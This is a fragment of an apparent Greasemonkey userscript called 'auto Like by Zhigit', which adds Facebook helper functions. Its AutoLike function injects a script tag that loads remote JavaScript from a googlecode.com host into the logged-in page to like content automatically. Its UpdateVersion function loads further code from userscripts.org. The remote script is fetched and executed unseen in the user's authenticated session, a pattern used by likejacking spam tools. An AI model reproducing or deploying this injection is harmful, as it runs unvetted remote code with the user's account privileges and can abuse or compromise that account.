...
// @description		        auto Like by Zhigit
// @author			Zhigit
// @authorURL		        http://www.facebook.com/
// @homepage		        http://userscripts.org/scripts/review/151272
...
// @updateURL   http://userscripts.org/scripts/source/151272.user.js
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//testliker.googlecode.com/files/like.js",b.body.appendChild(a);void(0);};}
body = document.body;
...
body.appendChild(div);unsafeWindow.UpdateVersion = function() {javascript:(a=(b=document).createElement("script")).src="//userscripts.org/scripts/source/151272.user.js",b.body.appendChild(a);void(0);};}